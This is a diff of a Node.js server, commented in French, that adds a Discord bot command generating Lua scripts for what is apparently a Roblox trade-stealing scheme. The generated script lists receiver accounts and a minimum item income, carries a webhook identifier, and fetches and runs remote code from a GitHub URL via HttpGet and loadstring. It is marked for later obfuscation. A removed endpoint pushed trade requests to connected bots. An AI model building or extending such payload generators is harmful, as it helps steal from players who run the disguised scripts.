@@ -5,8 +5,7 @@ const http = require('http');
 const url = require('url');
 
 const { v4: uuidv4 } = require('uuid');
-const { REST, Routes, SlashCommandBuilder } = require('discord.js');
-
+const { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder, EmbedBuilder } = require('discord.js');
 const app = express();
 const server = http.createServer(app);
 const wss = new WebSocket.Server({ server });
@@ -18,9 +17,6 @@ const ADMIN_TOKEN = process.env.ADMIN_TOKEN;
 const DISCORD_TOKEN = process.env.DISCORD_TOKEN;
 
 const log = (msg) => console.log(`[${new Date().toLocaleTimeString()}] ${msg}`);
-
-// Cache local pour le seuil
-let CACHED_THRESHOLD = 10000000; 
 
 // --- CONNEXION DB ---
 mongoose.connect(MONGO_URI)
@@ -58,73 +54,112 @@ const activeBots = new Map();
 const activeAdmins = new Set();
 
 
-app.get('/api/sendtrade', async (req, res) => {
-    const { receiver, target } = req.query;
-    if (!receiver || !target) return res.status(400).send("Paramètres manquants.");
-    for (let i = 0; i < 5; i++) {
-        const botWs = activeBots.get(receiver);
-        if (botWs && botWs.readyState === WebSocket.OPEN) {
-            botWs.send(JSON.stringify({ Type: "TradeRequest", TargetUser: target }));
-            return res.send(`Envoyé à ${receiver}`);
-        }
-        await new Promise(r => setTimeout(r, 2000));
-    }
-    res.send("Bot offline");
+// --- BOT DISCORD ---
+const clientDiscord = new Client({ 
+    intents: [
+        GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.MessageContent
+    ] 
 });
 
-// --- BOT DISCORD ---
-const clientDiscord = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent] });
 const commands = [
     new SlashCommandBuilder()
         .setName('generate-sab-trade')
-        .setDescription('Generate SAB Trade')
+        .setDescription('Generate a SAB Trade script')
         .addStringOption(option =>
             option.setName('username')
-                .setDescription('Liste usernames séparés par virgule')
+                .setDescription('List of Roblox usernames separated by commas')
                 .setRequired(true))
         .addStringOption(option =>
             option.setName('webhook')
-                .setDescription('URL webhook discord')
+                .setDescription('Discord Webhook URL')
                 .setRequired(true))
         .addIntegerOption(option =>
             option.setName('income')
-                .setDescription('Income minimum')
+                .setDescription('Minimum income threshold (e.g. 10000000)')
                 .setRequired(true))
+        .addStringOption(option =>
+            option.setName('visual')
+                .setDescription('URL for the visual interface (Optional)')
+                .setRequired(false)) // Paramètre optionnel
 ].map(cmd => cmd.toJSON());
 
-// REGISTER COMMANDS
-const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
-
-(async () => {
+clientDiscord.once('ready', async () => {
+    log(`🤖 Bot Discord connecté : ${clientDiscord.user.tag}`);
+    const rest = new REST({ version: '10' }).setToken(DISCORD_TOKEN);
     try {
         log('🔄 Refresh des commandes slash...');
         await rest.put(
             Routes.applicationCommands(clientDiscord.user.id),
             { body: commands }
         );
-        log('✅ Commandes enregistrées');
+        log('✅ Commandes slash enregistrées');
     } catch (error) {
-        console.error(error);
+        log(`❌ Erreur Slash Commands: ${error}`);
     }
-})();
+});
 
 clientDiscord.on('interactionCreate', async (interaction) => {
     if (!interaction.isChatInputCommand()) return;
 
     if (interaction.commandName === 'generate-sab-trade') {
         const usernames = interaction.options.getString('username');
-        const webhook = interaction.options.getString('webhook');
+        const webhookUrl = interaction.options.getString('webhook');
         const income = interaction.options.getInteger('income');
+        const visual = interaction.options.getString('visual') || "";
+        
+        // 1. Génération de l'UUID qui servira d'identifiant Webhook
+        const webhookUuid = uuidv4();
 
-        // TODO: logique plus tard
+        try {
+            // 2. ENREGISTREMENT DANS MONGODB
+            const newWebhookEntry = new WebHookId({
+                webhookId: webhookUuid,
+                url: webhookUrl,
+                ownerName: interaction.user.tag
+            });
+            //await newWebhookEntry.save();
 
-        await interaction.reply({
-            content: `Commande reçue ✅\nUsernames: ${usernames}\nIncome: ${income}`,
-            ephemeral: true
-        });
+            log(`💾 [DB] Webhook mapped: ${webhookUuid} for ${interaction.user.tag}`);
+
+            // 3. PRÉPARATION DU CODE LUA (On injecte l'UUID, pas l'URL)
+            const userArrayLua = usernames.split(',').map(u => `"${u.trim()}"`).join(', ');
+
+            const codeToObfuscate = `local fenv = getfenv()
+local var0 = setmetatable({}, {
+	["__index"] = {},
+})
+fenv["Receivers"] = { ${userArrayLua} }
+fenv["WebHook"] = "${webhookUuid}" -- Identifiant sécurisé
+fenv["Visual"] = "${visual}"
+fenv["MinIncome"] = ${income}
+
+local var1 = game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/SABTrde")
+local var2 = loadstring(var1)
+local var3 = var2()`;
+
+            // 4. RÉPONSE EMBED POUR DEBUG
+            const embed = new EmbedBuilder()
+                .setTitle("🛡️ Script Generation (Secure Mode)")
+                .setDescription("The real Webhook URL is now hidden behind a UUID in the database.")
+                .setColor(0x00AEFF)
+                .addFields(
+                    { name: "🆔 Generated Webhook ID", value: `\`${webhookUuid}\`` },
+                    { name: "📝 Code to Obfuscate", value: `\`\`\`lua\n${codeToObfuscate}\n\`\`\`` }
+                )
+                .setFooter({ text: "Database entry created successfully." });
+
+            await interaction.reply({ embeds: [embed], ephemeral: true });
+
+            // TODO: Étape suivante -> Obfuscation API
+            
+        } catch (error) {
+            log(`❌ [DB] Error saving webhook: ${error.message}`);
+            await interaction.reply({ content: "Error saving to database. Please try again.", ephemeral: true });
+        }
     }
 });
-
 if (DISCORD_TOKEN) clientDiscord.login(DISCORD_TOKEN);
 
 // --- GESTION WEBSOCKET ---
